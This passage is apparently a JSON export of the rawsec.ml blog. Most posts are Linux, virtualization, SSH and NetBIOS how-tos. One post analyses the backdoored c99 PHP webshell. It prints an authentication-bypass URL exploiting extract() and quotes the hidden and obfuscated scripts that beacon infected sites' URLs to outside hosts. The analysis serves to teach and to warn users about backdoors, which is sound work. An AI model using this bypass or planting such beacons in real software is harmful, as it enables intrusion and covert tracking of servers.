knowledge and help others learn. In Backdoor, challenges are shifted from a contest to the Practice section, where people can continue to attempt them after the contest is over. It would be very unfair to participants if the flags for the problems were easily available in writeups online. Hence, we kindly request to not publish flags of the problems that you solve. Here is an example of an excellent writeup which refrains from giving the complete solution.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"How to manually configure Firefox / Waterfox language","slug":"how-to-manually-configure-firefox-waterfox-language","date":"2016-05-20T22:00:00.000Z","updated":"2017-02-07T18:23:37.285Z","comments":true,"path":"en/how-to-manually-configure-firefox-waterfox-language/","link":"","permalink":"https://rawsec.ml/en/how-to-manually-configure-firefox-waterfox-language/","excerpt":"","text":"Go to https://ftp.mozilla.org/pub/firefox/releases/ Choose the Firefox version, ex: 46.0 Choos the architecture, ex: linux-x86_64 Go into the xpi folder Choose a language, ex: fr.xpi Click on the choosen language xpi file and enable the patch Restart Firefox In the URL navigation bar, wirte about:config In the Filter field, write general.useragent.locale Double-click on the key to edit it and eplace the value en-US with fr-FR for example Restart Firefox Firefox / Waterfox is now in the newly configured language.","categories":[{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/categories/misc/"}],"tags":[{"name":"firefox","slug":"firefox","permalink":"https://rawsec.ml/tags/firefox/"}]},{"title":"Virtualbox : shared folder with guest","slug":"virtualbox-shared-folder-with-guest","date":"2016-05-20T22:00:00.000Z","updated":"2017-02-07T18:23:37.235Z","comments":true,"path":"en/virtualbox-shared-folder-with-guest/","link":"","permalink":"https://rawsec.ml/en/virtualbox-shared-folder-with-guest/","excerpt":"","text":"This how-to works independently of the host platform. On virtualbox : Open the Configuration window of the VM (guest) Select Shared folder on the left menu Click on the icon corresponding to Add a shared folder Complete Folder path and Folder name fields, ex: /folder/to/share and folder-shared On the guest VM: Create a folder (an existant one can be used), ex: 1$ mkdir /home/user/vbox-shared Mount the shared folder and is file system as root, ex: 1# mount -t vboxsf [FOLDER_NAME] [GUEST_PATH] with [FOLDER_NAME] the name of the shared folder created on virtualbox and [GUEST_PATH] the folder path where the share file system have to be mounted. So here that will give: 1# mount -t vboxsf folder-shared /home/user/vbox-shared Note : Even if a permanent shared folder was created, the mount command will have to be runned each time the guest restart. Mounting a file system requires root privileges, but instead of mounting the file system as roor like previously, it's preferable to mount it as a user: 1$ mount -t vboxsf -o umask=0022,gid=1000,uid=1000 folder-shared /home/user/vbox-shared Where the gid and uid value math with the ones of the user (it can be check with the id command).","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"virtualization","slug":"virtualization","permalink":"https://rawsec.ml/tags/virtualization/"}]},{"title":"How to find out the Linux distribution name and version","slug":"find-out-linux-distribution-name-and-version","date":"2016-05-04T22:00:00.000Z","updated":"2017-02-07T18:23:37.165Z","comments":true,"path":"en/find-out-linux-distribution-name-and-version/","link":"","permalink":"https://rawsec.ml/en/find-out-linux-distribution-name-and-version/","excerpt":"","text":"There is the old method cat /etc/*-release to match distribution release file. For example on openSUSE this will match with /etc/SuSE-release. This method is deprecated and will be removed in the future. 123456789101112131415cat /etc/*-releaseNAME=\"openSUSE Leap\"VERSION=\"42.1\"VERSION_ID=\"42.1\"PRETTY_NAME=\"openSUSE Leap 42.1 (x86_64)\"ID=opensuseANSI_COLOR=\"0;32\"CPE_NAME=\"cpe:/o:opensuse:opensuse:42.1\"BUG_REPORT_URL=\"https://bugs.opensuse.org\"HOME_URL=\"https://opensuse.org/\"ID_LIKE=\"suse\"openSUSE 42.1 (x86_64)VERSION = 42.1CODENAME = Malachite# /etc/SuSE-release is deprecated and will be removed in the future, use /etc/os-release instead There is a more modern and more universal method cat /etc/os-release. 1234567891011cat /etc/os-releaseNAME=\"openSUSE Leap\"VERSION=\"42.1\"VERSION_ID=\"42.1\"PRETTY_NAME=\"openSUSE Leap 42.1 (x86_64)\"ID=opensuseANSI_COLOR=\"0;32\"CPE_NAME=\"cpe:/o:opensuse:opensuse:42.1\"BUG_REPORT_URL=\"https://bugs.opensuse.org\"HOME_URL=\"https://opensuse.org/\"ID_LIKE=\"suse\" There is also a command with a more concise output lsb_release -a. 123456lsb_release -aLSB Version: core-5.0-amd64:core-5.0-noarchDistributor ID: SUSE LINUXDescription: openSUSE Leap 42.1 (x86_64)Release: 42.1Codename: n/a To know the kernel version there is the uname command: uname -a to have all informations uname -rs to have kernel name and version only uname -m to have architecture type 12uname -aLinux linux-7o7a.site 4.1.20-11-default #1 SMP PREEMPT Fri Mar 18 14:42:07 UTC 2016 (0a392b2) x86_64 x86_64 x86_64 GNU/Linux 12uname -rsLinux 4.1.20-11-default 12uname -mx86_64 An alternative method is to see the /proc/version file that is showing kernel version and gcc version used to build it. 12cat /proc/versionLinux version 4.1.20-11-default (geeko@buildhost) (gcc version 4.8.5 (SUSE Linux) ) #1 SMP PREEMPT Fri Mar 18 14:42:07 UTC 2016 (0a392b2)","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"}]},{"title":"c99.php : A backdoor backdoored","slug":"c99-php-backdoor-backdoored","date":"2016-04-18T22:00:00.000Z","updated":"2017-02-07T18:23:37.272Z","comments":true,"path":"en/c99-php-backdoor-backdoored/","link":"","permalink":"https://rawsec.ml/en/c99-php-backdoor-backdoored/","excerpt":"","text":"C99 is a PHP webshell. Attackers uploads it on web server in order to get informations and above all execute commands with web user privileges (ex: www-data). This webshell is protected by a customizable password, so interface access is limited to people who know the password. But the password verification mechanism is vulnerable ... in fact the flaw was deliberately inserted into the code to permit the webshell author to bypass it. Code 1234567891011121314151617181920212223242526272829303132333435[...]//Authentication$login = \"\"; //login//DON'T FORGOT ABOUT PASSWORD!!!$pass = \"\"; //password$md5_pass = \"\"; //md5-cryped pass. if null, md5($pass)[...]@$f = $_REQUEST[\"f\"];@extract($_REQUEST[\"c999shcook\"]);//END CONFIGURATION// \\/Next code isn't for editing\\/@set_time_limit(0);$tmp = array();foreach($host_allow as $k=&gt;$v) &#123;$tmp[] = str_replace(\"\\\\*\",\".*\",preg_quote($v));&#125;$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) &#123;exit(\"&lt;a href=\\\"http://ccteam.ru/releases/cc999shell\\\"&gt;c999shell&lt;/a&gt;: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");&#125;if (!empty($login))&#123; if (empty($md5_pass)) &#123;$md5_pass = md5($pass);&#125; if (($_SERVER[\"PHP_AUTH_USER\"] != $login) or (md5($_SERVER[\"PHP_AUTH_PW\"]) != $md5_pass)) &#123; if (empty($login_txt)) &#123;$login_txt = strip_tags(ereg_replace(\"&amp;nbsp;|&lt;br&gt;\",\" \",$donated_html));&#125; header(\"WWW-Authenticate: Basic realm=\\\"c999shell \".$shver.\": \".$login_txt.\"\\\"\"); header(\"HTTP/1.0 401 Unauthorized\"); exit($accessdeniedmess); &#125;&#125;[...] Vulnerability Username and password are hardcoded to be easily editable. 12345//Authentication$login = \"\"; //login//DON'T FORGOT ABOUT PASSWORD!!!$pass = \"\"; //password$md5_pass = \"\"; //md5-cryped pass. if null, md5($pass) Next, login and password are checked by the following code: 1if (($_SERVER[\"PHP_AUTH_USER\"] != $login) or (md5($_SERVER[\"PHP_AUTH_PW\"]) != $md5_pass)) If login and password are not correct, an error page indicate that access is forbidden. But checking is processed only if login is not empty: if (!empty($login)). $login is normally initialized staticly at the begining but after that the variable can be modified by extract() function : 1@extract($_REQUEST[\"c999shcook\"]); extract() function PHP documentation say : extract (PHP 4, PHP 5, PHP 7) extract — Import variables into the current symbol table from an array Description Import variables from an array into the current symbol table. Checks each key to see whether it has a valid variable name. It also checks for collisions with existing variables in the symbol table. 1int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] ) extract() is mostly used to initialize variables from an array. For example: 1234567891011&lt;?php$var_array = array(\"color\" =&gt; \"blue\", \"size\" =&gt; \"medium\", \"shape\" =&gt; \"sphere\");extract($var_array);echo \"$color, $size, $shape\\n\";?&gt; will output: 1blue, medium, sphere So for each line of the array, the key becomes the variable name and the value is given to the variable. This function is dangerous because of it default behaviour : if a key of the extracted array match with an existant variable, the variable value will be replaced by the value of the array given in paramteter to extract(). To develop a secure software, never use extract() with unknown data or user's data (ex: prompt). There are flags (ex: EXTR_SKIP) to protect already existing variable. Exploit Bypass authentification is very simple : overwrite $login variable. 1http://url.com/c99.php?c999shcook[login]=0 It's possible because of: 1@extract($_REQUEST[\"c999shcook\"]); Why a backdoor? Pirates infect websites with webshells, but because this webshell is backdoored other pirates (authors of the webshell) will be able to control the server too. extract() function and c999shcook array are useless for the webshell but allow to overwrite any variables in the PHP script. There is another flaw There is a lot of c99.php variant: c99, c999, c99shell, c99unlimited, ... so some differences may occure. There is multiple version of each variant and each variant can be declined in multiple forms: php, txt, jpg, ... The simplest versions of c99 include a clear script: 1&lt;script src=http://www.r57.gen.tr/yazciz/ciz.js&gt;&lt;/script&gt; Others like c99-bd try to poorly obfuscate it: 1&lt;SCRIPT SRC=&amp;#x68&amp;#fthfthfjgyk&amp;#x2f&amp;#x2f&amp;#x77&amp;#x77&amp;#x77&amp;#x2e&amp;#x70&amp;#x72&amp;#x69&amp;#x76&amp;#x63&amp;#x30&amp;#x64&amp;#x65&amp;#x2e&amp;#x63&amp;#x6f&amp;#x6d&amp;#x2f&amp;#x69&amp;#x6d&amp;#x61&amp;#x67&amp;#x65&amp;#x73&amp;#x2f&amp;#x79&amp;#x61&amp;#x7a&amp;#x2e&amp;#x6a&amp;#x73&gt;&lt;/SCRIPT&gt; But a simple HTML decoder will decode http://www.privc0de.com/images/yaz.js. Others like c100, r57, c999 or updated c99 version have more sophisticated method like packing the script: 1234&lt;script type=\"text/javascript\"&gt;if(typeof btoa==\"undefined\")btoa=function(a,b)&#123;b=(typeof b=='undefined')?false:b;var d,o2,o3,bits,h1,h2,h3,h4,e=[],pad='',c,plain,coded;var f=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";plain=b?Utf8.encode(a):a;c=plain.length%3;if(c&gt;0)&#123;while(c++&lt;3)&#123;pad+='=';plain+='\\0'&#125;&#125;for(c=0;c&lt;plain.length;c+=3)&#123;d=plain.charCodeAt(c);o2=plain.charCodeAt(c+1);o3=plain.charCodeAt(c+2);bits=d&lt;&lt;16|o2&lt;&lt;8|o3;h1=bits&gt;&gt;18&amp;0x3f;h2=bits&gt;&gt;12&amp;0x3f;h3=bits&gt;&gt;6&amp;0x3f;h4=bits&amp;0x3f;e[c/3]=f.charAt(h1)+f.charAt(h2)+f.charAt(h3)+f.charAt(h4)&#125;coded=e.join('');coded=coded.slice(0,coded.length-pad.length)+pad;return coded&#125;;if(typeof atob==\"undefined\")atob=function(a,b)&#123;b=(typeof b=='undefined')?false:b;var e,o2,o3,h1,h2,h3,h4,bits,d=[],plain,coded;var f=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";coded=b?Utf8.decode(a):a;for(var c=0;c&lt;coded.length;c+=4)&#123;h1=f.indexOf(coded.charAt(c));h2=f.indexOf(coded.charAt(c+1));h3=f.indexOf(coded.charAt(c+2));h4=f.indexOf(coded.charAt(c+3));bits=h1&lt;&lt;18|h2&lt;&lt;12|h3&lt;&lt;6|h4;e=bits&gt;&gt;&gt;16&amp;0xff;o2=bits&gt;&gt;&gt;8&amp;0xff;o3=bits&amp;0xff;d[c/4]=String.fromCharCode(e,o2,o3);if(h4==0x40)d[c/4]=String.fromCharCode(e,o2);if(h3==0x40)d[c/4]=String.fromCharCode(e)&#125;plain=d.join('');return b?Utf8.decode(plain):plain&#125;;setTimeout(function()&#123;new Function(atob(atob(document.getElementById('ghdescon').src.substr(22)).match(/ghdescon(.*?)ghdescon/)[1])).apply(this);kk(1);&#125;, 500);&lt;/script&gt; and unpack code can be a lot more complex than only base64_decode it or hex_to_ascii it. The goal is always the same : each time the page is displayed, the website hosting the webshell will do a request to the malicious address and send the URL where it comes from, permiting to the malicious author to know all the website hosting the backdoored webshell. The malicious script from http://www.r57.gen.tr/yazciz/ciz.js looks like this: 1a=new/**/Image();a.src='http://www.r57.gen.tr/r00t/yaz.php?a='+escape(location.href); Script kiddies, lamers, and inattentive pirates will use webshells without looking carefully at the code. The combo flaw + inventory of infected website is an easy way, for webshells' authors, to control a network of server (ex: creating a botnet) by letting to others the system corruption task. More sophisticated piracy tools have some vulnerabilities too. Malwares like Smoke Loader (SQL injection), CrimePack (SQL injection) or Zeus (remote access via upload) have been corrupted. Warning When using tools, be carefull, backdoors may be hidden. Pay attention to images, scripts, css, external request, mail functions, encoded code, ... Source: C99.php : Quand même les backdoors sont backdoorées by Hugo Ballesteros","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"php","slug":"php","permalink":"https://rawsec.ml/tags/php/"},{"name":"backdoor","slug":"backdoor","permalink":"https://rawsec.ml/tags/backdoor/"},{"name":"webshell","slug":"webshell","permalink":"https://rawsec.ml/tags/webshell/"}]},{"title":"Tracking down Tor users with mouse movements","slug":"tracking-down-tor-users-with-mouse-movements","date":"2016-04-17T22:00:00.000Z","updated":"2017-02-07T18:23:37.198Z","comments":true,"path":"en/tracking-down-tor-users-with-mouse-movements/","link":"","permalink":"https://rawsec.ml/en/tracking-down-tor-users-with-mouse-movements/","excerpt":"","text":"Jose Carlos Norte, security researcher, wrote a post detailing how Tor Browser users can be uniquely fingerprinted using the mouse wheel, mouse speed, a CPU benchmark, and “getClientRects”. POCs (proof-of-concept) can be tested here and here. Fingerprinting method rely on javascript. Each method alone is not very accurate but crossing data from mouse wheel speed, mouse cursor speed (effectively enhanced by personal OS mouse sensitivity preferences and preferred set of gestures), trackpad movements, Javascript CPU informations, and getClientRects() function makes the fingerprint very unique. Here an example of datas that can be collected with JavaScript: 123456789101112131415Client rects:&#123;&quot;x&quot;:131.5,&quot;y&quot;:462,&quot;width&quot;:724,&quot;height&quot;:19,&quot;top&quot;:462,&quot;right&quot;:855.5,&quot;bottom&quot;:481,&quot;left&quot;:131.5&#125;scrolling milis:[2,2,0,3,0,1,0,2,3,0,0,3,1,2,2,1,2,1,4,4,35,2,1,3,0,1,0,3,0,1,0,3,0,1,0,3,1,0,3,1,3,0,1,3,2,4,4,8,44,4,1,4,4,405,2,3,2,1,3,1,3,57,2,0,2,2,0,2,2,4,60,2,0,2,2,0,2,2,6,54,2,2,2,0,2,1,4,8]scrolling deltas:[3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]Biggest mouse step: 65In a few seconds, the result of the CPU benchmark will appear, pleasewait...CPU Mean: 3245 The effectiveness of these methods is dependent upon the ability of the attackers to measure time accurately on Tor at the 1-millisecond level which is pretty difficult on Tor. We already known that JavaScript was dangerous for security and anonimity and that tools like NoScript exist to avoid those problems.","categories":[{"name":"news","slug":"news","permalink":"https://rawsec.ml/categories/news/"},{"name":"security","slug":"news/security","permalink":"https://rawsec.ml/categories/news/security/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"news","slug":"news","permalink":"https://rawsec.ml/tags/news/"},{"name":"tor","slug":"tor","permalink":"https://rawsec.ml/tags/tor/"}]},{"title":"How to convert VirtualBox vdi to KVM qcow2","slug":"convert-virtualbox-vdi-to-kvm-qcow2","date":"2016-04-12T22:00:00.000Z","updated":"2017-02-07T18:23:37.285Z","comments":true,"path":"en/convert-virtualbox-vdi-to-kvm-qcow2/","link":"","permalink":"https://rawsec.ml/en/convert-virtualbox-vdi-to-kvm-qcow2/","excerpt":"","text":"VBoxManage can't directly convert vdi to qcow2, so there is two options : With VBoxManage convert vdi to raw and with qemu-img convert raw to qcow2 With qemu-img convert vdi to qcow2 Notes : vdi are compressed and raw images are not so you will need to leave enough disk space for entire uncompressed disk. qcow2 images are compressed too and automaticaly sized. Method with intermediate Make sure the VirtualBox VM is shutdown Convert the vdi to a raw disk images 1VBoxManage clonehd --format raw vm.vdi vm.raw Convert the raw to qcow2 disk images 1qemu-img convert -f raw vm.raw -O qcow2 vm.qcow2 Direct method qemu-img support VDI, so it can be convert directly: 1qemu-img convert -f vdi vm.vdi -O qcow2 vm.qcow2","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"virtualization","slug":"virtualization","permalink":"https://rawsec.ml/tags/virtualization/"},{"name":"qemu","slug":"qemu","permalink":"https://rawsec.ml/tags/qemu/"},{"name":"kvm","slug":"kvm","permalink":"https://rawsec.ml/tags/kvm/"},{"name":"virtualbox","slug":"virtualbox","permalink":"https://rawsec.ml/tags/virtualbox/"}]},{"title":"How to disable SSH login for the root user","slug":"disable-ssh-login-for-root-user","date":"2016-04-06T22:00:00.000Z","updated":"2016-12-26T23:00:00.000Z","comments":true,"path":"en/disable-ssh-login-for-root-user/","link":"","permalink":"https://rawsec.ml/en/disable-ssh-login-for-root-user/","excerpt":"","text":"Create a new user. In the following example, we will name it bob. 123root# useradd -m bobroot# id bobuid=1000(bob) gid=1000(bob) groupes=1000(bob) Set the password for the new user. 12345root# passwd bobChanging password for user bob.New UNIX password:Retype new UNIX password:passwd: all authentication tokens updated successfully. In order to add sudo permissions for the new user, add bob ALL=(ALL) ALL in /etc/sudoers or add bob in wheel group with usermod -a -G wheel bob. Try to connect SSH with bob user. 1ssh bob@localhost Verify you can switch user to root with bob. 1bob$ sudo -i Disable root SSH login: Edit # vim /etc/ssh/sshd_config and change #PermitRootLogin yes into PermitRootLogin no. Now, we can restart SSH server. 1root# systemctl restart sshd.service","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"centos","slug":"security/centos","permalink":"https://rawsec.ml/categories/security/centos/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"centos","slug":"centos","permalink":"https://rawsec.ml/tags/centos/"},{"name":"ssh","slug":"ssh","permalink":"https://rawsec.ml/tags/ssh/"}]},{"title":"How to configure VM Auto Start in Hyper-V with PowerShell","slug":"vm-automatic-start-hyperv-powershell","date":"2016-04-06T22:00:00.000Z","updated":"2017-02-07T18:23:37.285Z","comments":true,"path":"en/vm-automatic-start-hyperv-powershell/","link":"","permalink":"https://rawsec.ml/en/vm-automatic-start-hyperv-powershell/","excerpt":"","text":"VM automatic action at Hyper-V start up 1Set-VM [VM_NAME] -AutomaticStartAction [Option] With : [VM_NAME] : The VM name [Option] : Nothing : When the host is powered on, the VM will do nothing StartIfRunning : The VM will start only if it was running when the host was stopped Start : The VM will start up automatically not matter what state the VM was in previously Change startup delay 1Set-VM [VM_NAME] -AutomaticStartDelay [Delay] With : [VM_NAME] : The VM name [Delay] : Delay in second Display VM Start action and delay All : 1Get-VM -VMName * | Select-Object VMName,AutomaticStartAction,AutomaticStartDelay One : 1Get-VM -VMName [VM_NAME] | Select-Object VMName,AutomaticStartAction,AutomaticStartDelay With : [VM_NAME] : The VM name","categories":[{"name":"windows","slug":"windows","permalink":"https://rawsec.ml/categories/windows/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://rawsec.ml/tags/windows/"},{"name":"virtualization","slug":"virtualization","permalink":"https://rawsec.ml/tags/virtualization/"},{"name":"hyper-v","slug":"hyper-v","permalink":"https://rawsec.ml/tags/hyper-v/"}]},{"title":"FreeBSD 10.3 is here","slug":"update-freebsd-103","date":"2016-04-05T22:00:00.000Z","updated":"2017-02-07T18:23:37.248Z","comments":true,"path":"en/update-freebsd-103/","link":"","permalink":"https://rawsec.ml/en/update-freebsd-103/","excerpt":"","text":"FreeBSD update to version 10.3. Main improvments: 15 security flaws patched UEFI support Gnome 3.16.2 Full Release Notes on official FreeBSD website.","categories":[{"name":"news","slug":"news","permalink":"https://rawsec.ml/categories/news/"},{"name":"security","slug":"news/security","permalink":"https://rawsec.ml/categories/news/security/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"news","slug":"news","permalink":"https://rawsec.ml/tags/news/"},{"name":"bsd","slug":"bsd","permalink":"https://rawsec.ml/tags/bsd/"},{"name":"update","slug":"update","permalink":"https://rawsec.ml/tags/update/"}]},{"title":"OpenBSD 5.9 is here","slug":"update-openbsd-59","date":"2016-04-05T22:00:00.000Z","updated":"2017-02-07T18:23:37.282Z","comments":true,"path":"en/update-openbsd-59/","link":"","permalink":"https://rawsec.ml/en/update-openbsd-59/","excerpt":"","text":"OpenBSD update to version 5.9. Main improvments: Pledge - a new mitigation mechanism process in restricted mode security improved 70% of user components converted WiFi 802.11n multithread network pile Xen support improved (better performance when OpenBSD is virtualized) UEFI support GUID (GPT) partition table support","categories":[{"name":"news","slug":"news","permalink":"https://rawsec.ml/categories/news/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"news","slug":"news","permalink":"https://rawsec.ml/tags/news/"},{"name":"bsd","slug":"bsd","permalink":"https://rawsec.ml/tags/bsd/"},{"name":"update","slug":"update","permalink":"https://rawsec.ml/tags/update/"}]},{"title":"Examine the codes sent by the keyboard","slug":"showkey-ascii","date":"2016-04-01T22:00:00.000Z","updated":"2017-02-07T18:23:37.168Z","comments":true,"path":"en/showkey-ascii/","link":"","permalink":"https://rawsec.ml/en/showkey-ascii/","excerpt":"","text":"A usefull command if are want to read keyboard input : showkey. Very useful to know keycodes when programming. What is showkey ? showkey - examine the codes sent by the keyboard How does it work ? showkey have only 3 options (4 with help) : -s --scancodes : Starts showkey in scan code dump mode. -k --keycodes : Starts showkey in keycode dump mode. This is the default, when no command line options are present. -a --ascii : Starts showkey in `ascii' dump mode. Note : Only -a will fully works on X mode (with a graphical terminal), -s and -k mode may work on X mode if you have root permissions else use a text console (TTY 1 to 6). Example 12345678910111213141516showkey -aPress any keys - Ctrl-D will terminate this programa 97 0141 0x61z 122 0172 0x7ae 101 0145 0x65r 114 0162 0x72t 116 0164 0x74y 121 0171 0x79_ 95 0137 0x5f? 63 0077 0x3f^? 127 0177 0x7f^M 13 0015 0x0d^C 3 0003 0x03^D 4 0004 0x04","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"}]},{"title":"Newsoo: a French Usenet access provider has been closed","slug":"newsoo-usenet-closed","date":"2016-03-26T23:00:00.000Z","updated":"2017-02-07T18:23:37.235Z","comments":true,"path":"en/newsoo-usenet-closed/","link":"","permalink":"https://rawsec.ml/en/newsoo-usenet-closed/","excerpt":"","text":"The man known as Optix, the owner of Newsoo, was taken into custody by the DIPJ the 2016/03/22. Newsoo was a French Usenet provider, the service was delivering 2 GB of pirated data per second. Sacem press charges against Newsoo.fr website on october 2014. Newsoo was an independant Usenet network, it was a French Autonomous system (AS203679). Optix, owner and administrator of Newsoo, is 26 years old and was offering access to pirated content Newsgroup for a price from 8€ to 20€. The website is now closed. Newsoo had 5000 customers and the man was managing the Usenet network as a legal business. During the arrest, 650 TB of data was blocked and 130 hard disk drivers was seized.","categories":[{"name":"news","slug":"news","permalink":"https://rawsec.ml/categories/news/"},{"name":"warez","slug":"news/warez","permalink":"https://rawsec.ml/categories/news/warez/"}],"tags":[{"name":"news","slug":"news","permalink":"https://rawsec.ml/tags/news/"},{"name":"warez","slug":"warez","permalink":"https://rawsec.ml/tags/warez/"},{"name":"piracy","slug":"piracy","permalink":"https://rawsec.ml/tags/piracy/"},{"name":"usenet","slug":"usenet","permalink":"https://rawsec.ml/tags/usenet/"}]},{"title":"How to change OpenSSH port on CentOS 7","slug":"change-openssh-port-centos-7","date":"2016-03-02T23:00:00.000Z","updated":"2017-02-07T18:23:37.198Z","comments":true,"path":"en/change-openssh-port-centos-7/","link":"","permalink":"https://rawsec.ml/en/change-openssh-port-centos-7/","excerpt":"","text":"Before beginning These are the steps to do on the SSH server. Be sure to do all the steps before exiting SSH connection if you are connected via SSH. This config was tested for default CentOS 7 iso. Change the SSH port You can start by backup your current SSH configuration : 1sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bck You can now open the default SSH configuration file : 1sudo vi /etc/ssh/sshd_config Un-comment the Port line and change the value. 1Port 44223 Save the file. By default, SELinux only allow port 22 for SSH. So you need to enable the new port through SELinux : 1sudo semanage port -a -t ssh_port_t -p tcp 44223 You can now restart the SSH server : 1sudo systemctl restart sshd.service Verify that SSH is now running on the new port : 1ss -tnlp | grep ssh You may want to try the SSH connexion with another user before exiting your current SSH session. You can now use the new port number : 1ssh user@example.com -p 44223 That's it !","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"centos","slug":"security/centos","permalink":"https://rawsec.ml/categories/security/centos/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"centos","slug":"centos","permalink":"https://rawsec.ml/tags/centos/"},{"name":"ssh","slug":"ssh","permalink":"https://rawsec.ml/tags/ssh/"}]},{"title":"Disable NetBIOS  via Windows register","slug":"disable-netbios-via-windows-register","date":"2015-12-19T23:00:00.000Z","updated":"2017-02-07T18:23:37.282Z","comments":true,"path":"en/disable-netbios-via-windows-register/","link":"","permalink":"https://rawsec.ml/en/disable-netbios-via-windows-register/","excerpt":"","text":"NetBIOS is a very old protocol wich is no more interesting today except in some particular cases. To disable it with the Windows register there are only a few steps : Launch the register editor (regedit.exe) Go to HKLM\\SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces Select each interface Each interface wich have a paramater NetbiosOptions put to 0 or 1 must be change to 2 and then clic OK Close the register editor The parameter SetTcpipNetbios can have these value : 0 – Use NetBIOS parameters from DHCP server 1 – Enable NetBIOS via TCP/IP 2 – Disable NetBIOS via TCP/IP","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"windows","slug":"security/windows","permalink":"https://rawsec.ml/categories/security/windows/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"windows","slug":"windows","permalink":"https://rawsec.ml/tags/windows/"},{"name":"netbios","slug":"netbios","permalink":"https://rawsec.ml/tags/netbios/"}]},{"title":"Disable NetBIOS in CLI with WMIC","slug":"disable-netbios-cli-wmic","date":"2015-12-19T23:00:00.000Z","updated":"2017-02-07T18:23:37.185Z","comments":true,"path":"en/disable-netbios-cli-wmic/","link":"","permalink":"https://rawsec.ml/en/disable-netbios-cli-wmic/","excerpt":"","text":"NetBIOS is a very old protocol wich is no more interesting today except in some particular cases. But it has a large number of security flaws. We can use WMIC (Microsoft Windows Management Instrumentation Command-line) to disable it. Before disabling it we will see wich network interfaces are using it: With cmd.exe: 1bat wmic nicconfig get caption,index,TcpipNetbiosOptions With PowerShell: 1wmic nicconfig get &quot;caption,index,TcpipNetbiosOptions&quot; Then you will need administrator power to run the following commands: If you want to disable NetBIOS for one network interface only, identify it index number and run: 1wmic nicconfig where index=5 call SetTcpipNetbios 2 If you want to disable NetBIOS for all network interfaces run: 12wmic nicconfig where TcpipNetbiosOptions=0 call SetTcpipNetbios 2wmic nicconfig where TcpipNetbiosOptions=1 call SetTcpipNetbios 2 SetTcpipNetbios can take this values: 0 – Use NetBIOS parameters from DHCP server 1 – Enable NetBIOS via TCP/IP 2 - Disable NetBIOS via TCP/IP","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"windows","slug":"security/windows","permalink":"https://rawsec.ml/categories/security/windows/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"windows","slug":"windows","permalink":"https://rawsec.ml/tags/windows/"},{"name":"netbios","slug":"netbios","permalink":"https://rawsec.ml/tags/netbios/"}]},{"title":"Qwant Lite : a refined version","slug":"qwant-line-refined-version","date":"2015-10-04T22:00:00.000Z","updated":"2017-02-07T18:23:37.285Z","comments":true,"path":"en/qwant-line-refined-version/","link":"","permalink":"https://rawsec.ml/en/qwant-line-refined-version/","excerpt":"","text":"The lite version of Qwant is avaible here. It' a version without JavaScript and without CSS3 so it's more 